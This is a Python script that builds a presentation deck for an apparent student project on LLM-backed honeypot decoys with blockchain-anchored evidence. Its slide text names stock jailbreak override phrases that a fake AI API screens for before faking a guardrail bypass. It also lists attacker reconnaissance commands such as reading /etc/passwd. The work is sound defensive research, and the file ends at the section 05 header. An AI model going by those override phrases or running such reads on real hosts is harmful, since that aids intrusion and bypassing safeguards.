#!/usr/bin/env python3
"""
Build PROJECT_PRESENTATION.pptx — the full project deck.

Every number in the deck is read from the real result files
(../evaluation_results.json, ../blockchain_results.json,
../apt_attack_dataset.json); nothing is hand-typed. Diagrams and charts are
reused from ../paper2/figures and ../paper3/figures.

Run:  .venv-ppt/bin/python build_ppt.py
"""
import json
import os
from collections import Counter

from pptx import Presentation
from pptx.util import Inches, Pt, Emu
from pptx.dml.color import RGBColor
from pptx.enum.text import PP_ALIGN, MSO_ANCHOR
from pptx.enum.shapes import MSO_SHAPE
from pptx.oxml.ns import qn

HERE = os.path.dirname(os.path.abspath(__file__))
CODE = os.path.dirname(HERE)
F2 = os.path.join(CODE, "paper2", "figures")
F3 = os.path.join(CODE, "paper3", "figures")
OUT = os.path.join(HERE, "PROJECT_PRESENTATION.pptx")

# ----------------------------------------------------------------- real data
EV = json.load(open(os.path.join(CODE, "evaluation_results.json")))
BC = json.load(open(os.path.join(CODE, "blockchain_results.json")))
DS = json.load(open(os.path.join(CODE, "apt_attack_dataset.json")))
DS_N = len(DS)
DS_BY_SVC = Counter(x.get("service") for x in DS)

# ------------------------------------------------------------------- palette
INK = RGBColor(0x0F, 0x17, 0x2A)      # near-black slate
BODY = RGBColor(0x33, 0x41, 0x55)     # body text
MUTED = RGBColor(0x7C, 0x8A, 0xA0)    # captions
WHITE = RGBColor(0xFF, 0xFF, 0xFF)
ACCENT = RGBColor(0x4F, 0x46, 0xE5)   # indigo — primary
TEAL = RGBColor(0x0D, 0x94, 0x88)     # secondary / "good"
AMBER = RGBColor(0xB4, 0x53, 0x09)    # warning / cost
RED = RGBColor(0xDC, 0x26, 0x26)      # attacker / danger
PANEL = RGBColor(0xF4, 0xF6, 0xFB)    # light card
PANEL_LN = RGBColor(0xDF, 0xE4, 0xEE)
NAVY = RGBColor(0x0B, 0x12, 0x26)     # divider background
FONT = "Arial"

SW, SH = 13.333, 7.5
M = 0.75                # page margin
CW = SW - 2 * M         # content width
BODY_TOP = 1.62

prs = Presentation()
prs.slide_width = Inches(SW)
prs.slide_height = Inches(SH)
BLANK = prs.slide_layouts[6]

_deck = []   # (slide, title) for the agenda / numbering


# ------------------------------------------------------------------ helpers
def new_slide():
    return prs.slides.add_slide(BLANK)


def rect(sl, l, t, w, h, fill=None, line=None, lw=1.0, shape=MSO_SHAPE.ROUNDED_RECTANGLE,
         radius=0.04):
    s = sl.shapes.add_shape(shape, Inches(l), Inches(t), Inches(w), Inches(h))
    if shape == MSO_SHAPE.ROUNDED_RECTANGLE:
        try:
            s.adjustments[0] = radius
        except Exception:
            pass
    if fill is None:
        s.fill.background()
    else:
        s.fill.solid()
        s.fill.fore_color.rgb = fill
    if line is None:
        s.line.fill.background()
    else:
        s.line.color.rgb = line
        s.line.width = Pt(lw)
    s.shadow.inherit = False
    s.text_frame.text = ""
    return s


def text(sl, s, l, t, w, h, size=16, bold=False, color=BODY, align=PP_ALIGN.LEFT,
         anchor=MSO_ANCHOR.TOP, spacing=1.0, italic=False, font=FONT):
    tb = sl.shapes.add_textbox(Inches(l), Inches(t), Inches(w), Inches(h))
    tf = tb.text_frame
    tf.word_wrap = True
    tf.margin_left = tf.margin_right = tf.margin_top = tf.margin_bottom = 0
    tf.vertical_anchor = anchor
    lines = s.split("\n")
    for i, ln in enumerate(lines):
        p = tf.paragraphs[0] if i == 0 else tf.add_paragraph()
        p.text = ln
        p.alignment = align
        p.line_spacing = spacing
        f = p.font
        f.size = Pt(size)
        f.bold = bold
        f.italic = italic
        f.color.rgb = color
        f.name = font
    return tb


def title(sl, t, sub=None, kicker=None):
    """Standard slide header: accent bar + title (+ optional subtitle)."""
    rect(sl, M, 0.62, 0.075, 0.52, fill=ACCENT, shape=MSO_SHAPE.RECTANGLE)
    top = 0.55
    if kicker:
        text(sl, kicker.upper(), M + 0.24, 0.44, CW - 0.3, 0.26, size=10.5,
             bold=True, color=ACCENT)
        top = 0.72
    text(sl, t, M + 0.24, top, CW - 0.3, 0.55, size=27, bold=True, color=INK)
    if sub:
        text(sl, sub, M + 0.24, top + 0.52, CW - 0.3, 0.35, size=13.5, color=MUTED)
    return sl


def bullets(sl, items, l, t, w, size=15, gap=None, dot=ACCENT, color=BODY, lead=1.18,
            pad=0.19):
    """Bulleted block with per-item height derived from estimated wrapped lines.

    items: list of str, or (head, tail) for a bold lead-in followed by body text.
    Each row is measured rather than given a fixed gap, so long items push the
    following ones down instead of overlapping them.
    """
    y = t
    indent = 0.30
    for it in items:
        head, tail = (it, None) if isinstance(it, str) else it
        full = head + (tail or "")
        # conservative average glyph width for Arial, in inches
        cpl = max(8, int((w - indent) / (size * 0.478 / 72.0)))
        nlines = max(1, -(-len(full) // cpl))
        lh = size * 1.2 * lead / 72.0
        row_h = nlines * lh
        tb = sl.shapes.add_textbox(Inches(l), Inches(y), Inches(w), Inches(row_h + 0.06))
        tf = tb.text_frame
        tf.word_wrap = True
        tf.margin_left = tf.margin_right = tf.margin_top = tf.margin_bottom = 0
        p = tf.paragraphs[0]
        p.line_spacing = lead
        r0 = p.add_run()
        r0.text = "▪   "
        r0.font.size = Pt(size)
        r0.font.bold = True
        r0.font.color.rgb = dot
        r0.font.name = FONT
        r1 = p.add_run()
        r1.text = head
        r1.font.size = Pt(size)
        r1.font.bold = tail is not None
        r1.font.color.rgb = INK if tail is not None else color
        r1.font.name = FONT
        if tail:
            r2 = p.add_run()
            r2.text = tail
            r2.font.size = Pt(size)
            r2.font.color.rgb = color
            r2.font.name = FONT
        y += row_h + pad
    return y


def picture(sl, path, l, t, w, h, caption=None, frame=True, pad=0.14):
    """Fit image inside the (l,t,w,h) box preserving aspect ratio, centered."""
    from PIL import Image
    iw, ih = Image.open(path).size
    ar = iw / ih
    bw, bh = w - 2 * pad, h - 2 * pad
    if bw / bh > ar:
        ph = bh
        pw = ph * ar
    else:
        pw = bw
        ph = pw / ar
    px = l + (w - pw) / 2
    py = t + (h - ph) / 2
    if frame:
        rect(sl, px - pad, py - pad, pw + 2 * pad, ph + 2 * pad,
             fill=WHITE, line=PANEL_LN, lw=1.0, radius=0.03)
    sl.shapes.add_picture(path, Inches(px), Inches(py), Inches(pw), Inches(ph))
    if caption:
        text(sl, caption, l, t + h + 0.08, w, 0.3, size=11, color=MUTED,
             align=PP_ALIGN.CENTER, italic=True)


def table(sl, headers, rows, l, t, w, col_w=None, hsize=12, bsize=11.5,
          row_h=0.36, head_fill=INK, zebra=True, align=None):
    nrow, ncol = len(rows) + 1, len(headers)
    h = row_h * nrow
    shp = sl.shapes.add_table(nrow, ncol, Inches(l), Inches(t), Inches(w), Inches(h))
    tbl = shp.table
    tbl.first_row = True
    tbl.horz_banding = False
    # kill the default PowerPoint table style so our fills show through
    tblPr = tbl._tbl.tblPr
    for e in tblPr.findall(qn('a:tableStyleId')):
        tblPr.remove(e)
    if col_w:
        tot = sum(col_w)
        for i, cwf in enumerate(col_w):
            tbl.columns[i].width = Emu(int(Inches(w) * cwf / tot))
    for i in range(nrow):
        tbl.rows[i].height = Inches(row_h)
    data = [headers] + rows
    for r, row in enumerate(data):
        for c, val in enumerate(row):
            cell = tbl.cell(r, c)
            cell.margin_left = Inches(0.11)
            cell.margin_right = Inches(0.08)
            cell.margin_top = Inches(0.03)
            cell.margin_bottom = Inches(0.03)
            cell.vertical_anchor = MSO_ANCHOR.MIDDLE
            cell.fill.solid()
            if r == 0:
                cell.fill.fore_color.rgb = head_fill
            elif zebra and r % 2 == 0:
                cell.fill.fore_color.rgb = PANEL
            else:
                cell.fill.fore_color.rgb = WHITE
            tf = cell.text_frame
            tf.word_wrap = True
            p = tf.paragraphs[0]
            p.text = str(val)
            p.alignment = (PP_ALIGN.LEFT if not align else align[c])
            f = p.font
            f.size = Pt(hsize if r == 0 else bsize)
            f.bold = (r == 0)
            f.color.rgb = WHITE if r == 0 else BODY
            f.name = FONT
    return shp


def stat(sl, l, t, w, h, value, label, note=None, color=ACCENT, vsize=30):
    rect(sl, l, t, w, h, fill=PANEL, line=PANEL_LN, radius=0.06)
    rect(sl, l, t, 0.055, h, fill=color, shape=MSO_SHAPE.RECTANGLE)
    text(sl, value, l + 0.26, t + 0.16, w - 0.4, 0.5, size=vsize, bold=True, color=color)
    text(sl, label, l + 0.26, t + 0.16 + vsize / 62.0, w - 0.4, 0.3, size=11.5,
         bold=True, color=INK)
    if note:
        text(sl, note, l + 0.26, t + 0.16 + vsize / 62.0 + 0.26, w - 0.4, 0.5,
             size=10, color=MUTED, spacing=1.05)


def chip(sl, l, t, w, h, n, head, sub, color=ACCENT):
    """Numbered step chip."""
    rect(sl, l, t, w, h, fill=WHITE, line=PANEL_LN, radius=0.07)
    rect(sl, l + 0.18, t + 0.16, 0.42, 0.42, fill=color, shape=MSO_SHAPE.OVAL)
    text(sl, str(n), l + 0.18, t + 0.235, 0.42, 0.3, size=14, bold=True,
         color=WHITE, align=PP_ALIGN.CENTER)
    text(sl, head, l + 0.72, t + 0.18, w - 0.9, 0.3, size=13.5, bold=True, color=INK)
    text(sl, sub, l + 0.72, t + 0.5, w - 0.9, h - 0.6, size=11, color=BODY, spacing=1.1)


def arrow(sl, l, t, w=0.28, color=RGBColor(0xB6, 0xBF, 0xD0)):
    s = sl.shapes.add_shape(MSO_SHAPE.RIGHT_ARROW, Inches(l), Inches(t),
                            Inches(w), Inches(0.2))
    s.fill.solid()
    s.fill.fore_color.rgb = color
    s.line.fill.background()
    s.shadow.inherit = False


def divider(n, kicker, head, sub):
    sl = new_slide()
    rect(sl, -0.1, -0.1, SW + 0.2, SH + 0.2, fill=NAVY, shape=MSO_SHAPE.RECTANGLE)
    rect(sl, 0, 0, 0.22, SH, fill=ACCENT, shape=MSO_SHAPE.RECTANGLE)
    text(sl, f"{n:02d}", 1.15, 2.05, 3.0, 1.4, size=76, bold=True,
         color=RGBColor(0x3B, 0x45, 0x6B))
    text(sl, kicker.upper(), 1.2, 3.35, 9.5, 0.3, size=11.5, bold=True, color=TEAL)
    text(sl, head, 1.2, 3.66, 10.6, 0.8, size=38, bold=True, color=WHITE)
    text(sl, sub, 1.2, 4.62, 10.0, 0.6, size=14.5,
         color=RGBColor(0x9F, 0xAB, 0xC4), spacing=1.2)
    mark_dark(sl)
    return sl


def footer_all():
    """Slide numbers + running footer on every slide except the title."""
    for i, sl in enumerate(prs.slides):
        if i == 0:
            continue
        dark = i in DARK_SLIDES
        c = RGBColor(0x55, 0x60, 0x7A) if dark else MUTED
        text(sl, "AI-Driven Cyber Deception & Attack Detection Framework",
             M, SH - 0.46, 7.0, 0.25, size=9, color=c)
        text(sl, str(i + 1), SW - M - 1.0, SH - 0.46, 1.0, 0.25, size=9,
             color=c, align=PP_ALIGN.RIGHT)


DARK_SLIDES = set()


def mark_dark(sl):
    DARK_SLIDES.add(len(prs.slides._sldIdLst) - 1)
    return sl


# =========================================================== 1. TITLE SLIDE
sl = new_slide()
mark_dark(sl)
rect(sl, -0.1, -0.1, SW + 0.2, SH + 0.2, fill=NAVY, shape=MSO_SHAPE.RECTANGLE)
rect(sl, 0, 0, SW, 0.16, fill=ACCENT, shape=MSO_SHAPE.RECTANGLE)
text(sl, "FINAL YEAR PROJECT  ·  RESEARCH & IMPLEMENTATION", M, 1.35, 10.0, 0.3,
     size=12, bold=True, color=TEAL)
text(sl, "AI-Driven Cyber Deception &\nAttack Detection Framework", M, 1.85, 11.5, 2.0,
     size=44, bold=True, color=WHITE, spacing=1.06)
rect(sl, M, 4.02, 2.2, 0.045, fill=ACCENT, shape=MSO_SHAPE.RECTANGLE)
text(sl,
     "Five LLM-backed decoy services  ·  tiered response engine  ·  "
     "blockchain-anchored, tamper-evident evidence  ·  live SOC dashboard",
     M, 4.32, 10.8, 0.9, size=15, color=RGBColor(0x9F, 0xAB, 0xC4), spacing=1.3)

box = [("%d" % DS_N, "real attack payloads"),
       ("%.2f/5" % EV["llm_judge_realism"]["mean_score_1to5"], "LLM-judge realism"),
       ("%.2f ms" % BC["anchor_latency_ms"]["mean_ms"], "mean anchor latency"),
       ("100%", "tamper detection")]
x = M
for v, lb in box:
    rect(sl, x, 5.5, 2.72, 1.05, fill=RGBColor(0x16, 0x1F, 0x38),
         line=RGBColor(0x2A, 0x35, 0x55), radius=0.08)
    text(sl, v, x + 0.22, 5.66, 2.4, 0.45, size=22, bold=True, color=WHITE)
    text(sl, lb, x + 0.22, 6.12, 2.4, 0.3, size=10.5, color=RGBColor(0x8F, 0x9C, 0xB8))
    x += 2.9

# ================================================================ 2. AGENDA
sl = new_slide()
title(sl, "What this deck covers", "Problem → design → build → measured results → research output")
agenda = [
    ("01", "The problem", "Why static honeypots stop working"),
    ("02", "System architecture", "Proxy, five decoys, collector, ledger, dashboard"),
    ("03", "The five decoys", "SSH · SQL · AI API · Web3 · CI/CD"),
    ("04", "Tiered response engine", "Static → cache → language model"),
    ("05", "Evidence pipeline", "Classify · hash · anchor · store · stream"),
    ("06", "Blockchain & threat model", "Tamper-evidence under decoy compromise"),
    ("07", "Evaluation & results", f"{DS_N} real payloads, 300 anchors, 500 tamper trials"),
    ("08", "Limitations & research output", "Honest framing + two IEEE papers"),
]
y = BODY_TOP + 0.1
for i, (n, h, s) in enumerate(agenda):
    col = i % 2
    row = i // 2
    l = M + col * (CW / 2 + 0.15)
    t = y + row * 1.27
    rect(sl, l, t, CW / 2 - 0.15, 1.1, fill=PANEL, line=PANEL_LN, radius=0.06)
    text(sl, n, l + 0.26, t + 0.24, 0.8, 0.5, size=25, bold=True,
         color=RGBColor(0xC3, 0xC9, 0xE4))
    text(sl, h, l + 1.15, t + 0.26, CW / 2 - 1.5, 0.34, size=15, bold=True, color=INK)
    text(sl, s, l + 1.15, t + 0.62, CW / 2 - 1.5, 0.34, size=11.5, color=MUTED)

# ============================================================ 01 THE PROBLEM
divider(1, "Motivation", "The problem",
        "A honeypot only produces intelligence for as long as the attacker believes it.")

sl = new_slide()
title(sl, "Why static honeypots stop working", kicker="Problem statement")
rect(sl, M, BODY_TOP, CW / 2 - 0.2, 4.55, fill=RGBColor(0xFE, 0xF2, 0xF2),
     line=RGBColor(0xF6, 0xD3, 0xD3), radius=0.05)
text(sl, "Classic honeypot", M + 0.3, BODY_TOP + 0.26, 4.5, 0.35, size=16, bold=True, color=RED)
bullets(sl, [
    "Replies come from a fixed script or dictionary — the same input always returns the same bytes.",
    "That makes the whole service a stable fingerprint; scanners such as Shodan-style probes and honeypot-detection tools match on it.",
    "Once fingerprinted, the attacker disengages — and the session ends before any real tradecraft is observed.",
    "Logs are plain files on the decoy host. An attacker who gets root can edit or delete the record of their own intrusion.",
], M + 0.3, BODY_TOP + 0.78, CW / 2 - 0.8, size=13, gap=0.83, dot=RED)

rect(sl, M + CW / 2 + 0.05, BODY_TOP, CW / 2 - 0.2, 4.55, fill=RGBColor(0xEE, 0xFB, 0xF7),
     line=RGBColor(0xC8, 0xEA, 0xE1), radius=0.05)
text(sl, "What this project does instead", M + CW / 2 + 0.35, BODY_TOP + 0.26, 4.5, 0.35,
     size=16, bold=True, color=TEAL)
bullets(sl, [
    "Responses are generated per interaction by a language model, so identical probes rarely yield identical output.",
    "Five decoys cover distinct, current attack surfaces rather than one protocol.",
    "Every record is SHA-256 hashed and its digest anchored on an Ethereum chain, outside the compromise boundary.",
    "Tampering with a stored record is provable: re-hash and compare against the on-chain digest.",
], M + CW / 2 + 0.35, BODY_TOP + 0.78, CW / 2 - 0.8, size=13, gap=0.83, dot=TEAL)

sl = new_slide()
title(sl, "Objectives", "What the system had to demonstrate, and how each was measured",
      kicker="Problem statement")
objs = [
    ("Believable deception", "Responses that a strong independent model rates as realistic system output",
     "LLM-judge score", "%.2f / 5" % EV["llm_judge_realism"]["mean_score_1to5"], ACCENT),
    ("Fingerprint resistance", "Distinct outputs across a large corpus of real attack payloads",
     "SQL uniqueness", "%.1f%%" % (EV["response_diversity_by_service"]["sql"]["uniqueness_ratio"] * 100), ACCENT),
    ("Usable latency", "Routine traffic must not pay the model's cost",
     "Static fast path", "%.1f ms" % (EV["latency"]["static"]["mean_s"] * 1000), TEAL),
    ("Tamper-evident evidence", "Detect any post-hoc modification of a stored record",
     "Detection rate", "%.0f%%" % BC["tamper_detection"]["detection_rate_pct"], TEAL),
    ("Affordable anchoring", "Chain write must be cheap enough to run per event",
     "Gas per anchor", "{:,}".format(int(round(BC["gas"]["mean_gas"]))), AMBER),
    ("Live visibility", "Analyst sees attacks as they happen, not on a batch job",
     "Transport", "WebSocket", AMBER),
]
y = BODY_TOP + 0.05
for i, (h, s, mlab, mval, c) in enumerate(objs):
    col, row = i % 2, i // 2
    l = M + col * (CW / 2 + 0.15)
    t = y + row * 1.62
    rect(sl, l, t, CW / 2 - 0.15, 1.44, fill=WHITE, line=PANEL_LN, radius=0.05)
    rect(sl, l, t, 0.05, 1.44, fill=c, shape=MSO_SHAPE.RECTANGLE)
    text(sl, h, l + 0.26, t + 0.2, 3.6, 0.3, size=14, bold=True, color=INK)
    text(sl, s, l + 0.26, t + 0.55, 3.55, 0.7, size=11, color=BODY, spacing=1.12)
    text(sl, mval, l + CW / 2 - 2.05, t + 0.34, 1.85, 0.45, size=19, bold=True,
         color=c, align=PP_ALIGN.RIGHT)
    text(sl, mlab, l + CW / 2 - 2.05, t + 0.83, 1.85, 0.3, size=9.5, color=MUTED,
         align=PP_ALIGN.RIGHT)

# =========================================================== 02 ARCHITECTURE
divider(2, "Design", "System architecture",
        "One public entry point, five decoys, a single evidence collector, two sinks.")

sl = new_slide()
title(sl, "End-to-end architecture", kicker="Architecture")
picture(sl, os.path.join(F2, "diag_arch.png"), M, BODY_TOP - 0.05, 8.0, 5.0,
        caption=None)
rect(sl, M + 8.2, BODY_TOP - 0.05, CW - 8.2, 5.0, fill=PANEL, line=PANEL_LN, radius=0.05)
text(sl, "Reading the diagram", M + 8.45, BODY_TOP + 0.2, 3.2, 0.3, size=14,
     bold=True, color=INK)
bullets(sl, [
    "Only the proxy and dashboard cross the public boundary.",
    "All five decoys and the collector sit on an isolated internal network.",
    "Decoys never talk to the ledger directly — they POST records to the collector.",
    "The language model is reached only on a miss in the tiered engine.",
    "The chain receives digests only; raw payloads stay off-chain.",
], M + 8.45, BODY_TOP + 0.66, 3.15, size=11.5, gap=0.83)

sl = new_slide()
title(sl, "Request lifecycle", "One attacker interaction, from TCP connect to dashboard row",
      kicker="Architecture")
picture(sl, os.path.join(F2, "diag_flow.png"), M, BODY_TOP + 0.05, CW, 3.15)
steps = [
    (1, "Connect", "Proxy accepts on a public port and logs the connection before the decoy replies — port scanners are recorded too."),
    (2, "Forward", "Traffic is forwarded to the matching internal decoy over the Docker network."),
    (3, "Respond", "The decoy asks the tiered engine for a reply: static table, then cache, then model."),
    (4, "Record", "The decoy POSTs the interaction to the collector, which classifies, hashes, anchors, stores and streams it."),
]
x = M
for n, h, s in steps:
    chip(sl, x, 5.05, (CW - 0.45) / 4, 1.5, n, h, s)
    x += (CW - 0.45) / 4 + 0.15

sl = new_slide()
title(sl, "Deployment topology", "Ten containers on one internal Docker network; two are published",
      kicker="Architecture")
table(sl,
      ["Container", "Image / build", "Port", "Exposure", "Role"],
      [["proxy", "custom", "2222 · 8080 · 5433 · 8545 · 9090", "PUBLIC", "Port router; logs every connection"],
       ["dashboard", "custom (React)", "3000", "PUBLIC*", "Live analyst UI over WebSocket"],
       ["backend", "custom (FastAPI)", "3001", "internal", "Collector: classify · hash · anchor · store · stream"],
       ["shadow-shell", "custom (asyncssh)", "2223", "internal", "Fake SSH server"],
       ["oracle-ai", "custom (FastAPI)", "8081", "internal", "Fake internal AI API"],
       ["vault-sql", "custom (FastAPI)", "5435", "internal", "Fake SQL query endpoint"],
       ["ledger-trap", "custom (FastAPI)", "8546", "internal", "Fake Ethereum JSON-RPC node"],
       ["forge-ci", "custom (FastAPI)", "9091", "internal", "Fake Jenkins CI/CD server"],
       ["redis", "redis:7-alpine", "6379", "internal", "Record store + response cache"],
       ["postgres", "postgres:15-alpine", "5434", "internal", "Seeded fake corporate database"],
       ["ganache", "trufflesuite/ganache", "7545", "internal", "Ethereum development chain"]],
      M, BODY_TOP + 0.05, CW, col_w=[1.5, 1.9, 2.6, 1.2, 4.6], row_h=0.355, bsize=11)
text(sl, "* the dashboard has no login of its own — put it behind a VPN, SSH tunnel or IP allowlist before exposing it.",
     M, 6.15, CW, 0.3, size=10.5, color=AMBER, italic=True)

# ============================================================= 03 THE DECOYS
divider(3, "Implementation", "The five decoys",
        "Each impersonates a different service that real adversaries actively hunt for.")

sl = new_slide()
title(sl, "Port routing", "The proxy is the only listener; it maps each public port to one decoy",
      kicker="Decoys")
table(sl,
      ["Public port", "Routes to", "Decoy", "Impersonates", "Attacker profile"],
      [["2222", "shadow-shell:2223", "SSH shell", "Ubuntu 22.04 host corp-prod-db-01", "Brute-force and post-exploitation"],
       ["5433", "vault-sql:5435", "PostgreSQL", "Corporate database with PII", "SQL injection and data theft"],
       ["8080", "oracle-ai:8081", "AI API", "Internal service gpt-corp-internal-v2", "Prompt injection and model abuse"],
       ["8545", "ledger-trap:8546", "Ethereum RPC", "Exposed Geth-style JSON-RPC node", "Wallet draining and RPC abuse"],
       ["9090", "forge-ci:9091", "Jenkins CI/CD", "Jenkins 2.387.3", "Supply-chain and pipeline injection"]],
      M, BODY_TOP + 0.25, CW, col_w=[1.3, 2.2, 1.5, 3.5, 3.3], row_h=0.5, bsize=12)
text(sl, "Logging at the proxy rather than inside each decoy means a connection is recorded even if the attacker "
         "never sends a byte of payload — reconnaissance scans show up in the evidence trail.",
     M, BODY_TOP + 3.5, CW, 0.6, size=12.5, color=BODY, spacing=1.25)

# --- decoy detail slides
def decoy_slide(name, port, pretends, mech, bait, color):
    sl = new_slide()
    title(sl, name, pretends, kicker="Decoys")
    rect(sl, M, BODY_TOP + 0.25, 3.3, 1.0, fill=color, radius=0.06)
    text(sl, "PORT", M + 0.3, BODY_TOP + 0.4, 2.7, 0.25, size=10, bold=True,
         color=RGBColor(0xE6, 0xE9, 0xF7))
    text(sl, port, M + 0.3, BODY_TOP + 0.62, 2.7, 0.5, size=24, bold=True, color=WHITE)
    text(sl, "How it works", M, BODY_TOP + 1.5, 3.3, 0.3, size=13.5, bold=True, color=INK)
    bullets(sl, mech, M, BODY_TOP + 1.95, 3.3, size=11.5, dot=color, pad=0.2)
    rect(sl, M + 3.7, BODY_TOP + 0.25, CW - 3.7, 4.55, fill=PANEL, line=PANEL_LN, radius=0.05)
    text(sl, bait[0], M + 4.0, BODY_TOP + 0.5, CW - 4.3, 0.3, size=14, bold=True, color=INK)
    bullets(sl, bait[1], M + 4.0, BODY_TOP + 0.98, CW - 4.4, size=12.5, dot=color, pad=0.22)
    return sl


decoy_slide(
    "shadow-shell — fake SSH server", "2222",
    "A real asyncssh server that accepts every credential and hands the attacker a convincing shell",
    ["Runs a genuine SSH server, not a text simulation.",
     "Every username/password pair is accepted and logged.",
     "Prompt reads dbadmin@corp-prod-db-01:~$",
     "Commands go through the three-tier engine.",
     "Session history is kept, so the shell stays consistent across commands."],
    ("What the attacker finds", [
        "A production-looking Ubuntu 22.04 database host, fully interactive.",
        "An env dump seeded with bait credentials (DB_PASS, DB_HOST pointing at an internal address).",
        "Realistic output for ls, whoami, ps aux, history, cat /etc/passwd — served instantly from the static table.",
        "Anything unusual is answered by the language model in the persona of that exact host, so exploration keeps working.",
        "Contextual memory: mkdir /tmp/hack then ls /tmp behaves consistently, because the last 20 turns are replayed to the model.",
    ]), ACCENT)

decoy_slide(
    "vault-sql — fake corporate database", "5433",
    "Two layers: a query endpoint that answers injection attempts, and a real seeded PostgreSQL instance",
    ["POST /query accepts arbitrary SQL.",
     "Injection attempts are logged, then answered with believable result sets or engine-accurate errors.",
     "A real PostgreSQL 15 instance is seeded from fake_data.sql.",
     "Errors imitate genuine PostgreSQL syntax and formatting."],
    ("Seeded honeypot data", [
        "users — fake bcrypt hashes, card numbers in valid Visa/Mastercard format, fake SSNs.",
        "financial_records — corporate accounts carrying seven-figure balances.",
        "api_keys — realistically shaped but non-functional OpenAI, GitHub (ghp_) and AWS (AKIA) keys.",
        "The bait is designed to look like a jackpot, so the attacker keeps querying — and every query reveals technique.",
        "Highest measured response uniqueness of any service: %.1f%% distinct across %d real SQLi payloads."
        % (EV["response_diversity_by_service"]["sql"]["uniqueness_ratio"] * 100,
           EV["response_diversity_by_service"]["sql"]["n"]),
    ]), TEAL)

decoy_slide(
    "oracle-ai — fake internal AI API", "8080",
    "An internal-looking model service that deliberately 'falls for' prompt injection",
    ["POST /api/predict returns fake predictions with confidence scores.",
     "POST /api/chat answers messages and screens for jailbreak phrasing.",
     "GET /api/models lists invented internal models.",
     "GET /health reports version 2.1.0."],
    ("Deception inside the deception", [
        "Messages containing jailbreak, ignore previous, pretend you or act as trigger a faked bypass: "
        "\"I understand. I will now operate in unrestricted mode.\"",
        "The attacker believes the guardrail is down and continues — every subsequent injection attempt is captured.",
        "This is the weakest service by response diversity (%.0f%% distinct): raw XXE and JNDI payloads push the model "
        "toward a generic 'malformed input' reply instead of a plausible parser error."
        % (EV["response_diversity_by_service"]["api"]["uniqueness_ratio"] * 100),
        "Documented as a concrete follow-up: the system prompt needs XML/JNDI-aware exemplars.",
    ]), AMBER)

decoy_slide(
    "ledger-trap — fake Ethereum node", "8545",
    "An exposed JSON-RPC endpoint, the single most scanned-for misconfiguration in Web3 infrastructure",
    ["Speaks standard Ethereum JSON-RPC.",
     "eth_getBalance reports a wallet holding 100 ETH.",
     "eth_sendRawTransaction returns a well-formed fake transaction hash.",
     "eth_accounts, eth_blockNumber and net_version answer plausibly."],
    ("Why this decoy exists", [
        "For an exposed RPC node, the method call itself is the attack — there is no separate payload to inject.",
        "Attackers are automated wallet-drainers scanning for unlocked accounts; the decoy captures their tooling and addresses.",
        "The dataset therefore holds only %d web3 entries: the real attack surface is a finite, documented set of RPC methods, "
        "and padding it would mean inventing payloads rather than using real ones."
        % DS_BY_SVC.get("web3", 0),
    ]), ACCENT)

decoy_slide(
    "forge-ci — fake Jenkins CI/CD server", "9090",
    "Build infrastructure, the entry point for supply-chain compromise",
    ["GET /api/json returns Jenkins node metadata.",
     "POST /job/build/api/json fakes a successful build trigger (#247).",
     "POST /git/notifyCommit fakes accepting a webhook and 'starting' deploy-prod.",
     "Identifies as Jenkins 2.387.3."],
    ("Why this decoy exists", [
        "Compromised CI/CD lets an attacker inject code into artefacts that are then trusted and shipped downstream.",
        "Payloads are drawn from real Jenkins security advisories: script-console RCE, job path traversal, pipeline sh-step abuse.",
        "Capped at %d entries for the same reason as web3 — a small, finite set of documented endpoints, not an open injection space."
        % DS_BY_SVC.get("cicd", 0),
    ]), TEAL)

# =========================================================== 04 TIERED ENGINE
divider(4, "Implementation", "The tiered response engine",
        "Escalate only on a miss — routine attacker traffic never reaches the model.")

sl = new_slide()
title(sl, "Three tiers, three cost profiles", kicker="Response engine")
picture(sl, os.path.join(F2, "diag_tier.png"), M, BODY_TOP - 0.05, CW, 2.6)
tiers = [
    ("Tier 1 · Static table", "%.1f ms" % (EV["latency"]["static"]["mean_s"] * 1000),
     "A hand-built dictionary answers the commands every attacker types first — ls, whoami, env, "
     "ps aux, history, cat /etc/passwd, ifconfig. No network call at all.", TEAL),
    ("Tier 2 · Redis cache", "≈ 1 ms",
     "Any command seen before returns its stored model output, keyed on the command plus session history "
     "and held for one hour. Repeat probes cost a cache read.", ACCENT),
    ("Tier 3 · Language model", "%.2f s" % EV["latency"]["dynamic"]["mean_s"],
     "Only genuinely novel input reaches %s via OpenRouter, with the host persona as a system message "
     "and the last 20 turns as context." % EV["config"]["engine_model"], AMBER),
]
x = M
for h, v, s, c in tiers:
    w = (CW - 0.4) / 3
    rect(sl, x, 4.32, w, 1.95, fill=WHITE, line=PANEL_LN, radius=0.05)
    rect(sl, x, 4.32, w, 0.06, fill=c, shape=MSO_SHAPE.RECTANGLE)
    text(sl, h, x + 0.26, 4.53, w - 0.5, 0.3, size=13.5, bold=True, color=INK)
    text(sl, v, x + 0.26, 4.85, w - 0.5, 0.45, size=22, bold=True, color=c)
    text(sl, s, x + 0.26, 5.38, w - 0.5, 0.85, size=10.5, color=BODY, spacing=1.15)
    x += w + 0.2
text(sl, "The tiering is what makes an LLM honeypot deployable: the expensive path is reserved for the "
         "interactions that actually need novelty.", M, 6.45, CW, 0.35, size=12.5,
     color=INK, italic=True, align=PP_ALIGN.CENTER)

sl = new_slide()
title(sl, "Prompting the model", "How a generic chat model is made to behave like one specific host",
      kicker="Response engine")
items = [
    ("System role. ", "The persona is sent as a proper system message, not prepended to the user turn: "
     "simulate the raw stdout/stderr of a bash shell on this host; never reveal that you are a model or a honeypot."),
    ("Session history. ", "The last 20 command/response pairs are replayed, so state the attacker created "
     "earlier in the session stays consistent."),
    ("Current input as user turn. ", "The attacker's raw command is the user message — unmodified, so the "
     "model sees exactly what was typed."),
    ("Tuned generation length. ", "Output is capped short; mean response length is %.1f words. Terminal output "
     "is terse, and shorter generations are both faster and more realistic." % EV["avg_response_words_dynamic"]),
    ("Connection pooling. ", "A persistent HTTP session to the model API removes per-call TLS setup — one of the "
     "three changes in the optimisation pass covered later."),
]
bullets(sl, items, M, BODY_TOP + 0.35, CW - 0.3, size=14, pad=0.28)
rect(sl, M, 5.95, CW, 0.9, fill=PANEL, line=PANEL_LN, radius=0.05)
text(sl, "Result: an independent 70B judge scored these responses %.2f / 5 for realism, with %d of %d samples "
         "rated a perfect 5."
     % (EV["llm_judge_realism"]["mean_score_1to5"], EV["llm_judge_realism"]["distribution"]["5"],
        EV["llm_judge_realism"]["n_scored"]),
     M + 0.3, 6.2, CW - 0.6, 0.5, size=13, bold=True, color=INK)

# ========================================================= 05 EVIDENCE PIPELINE
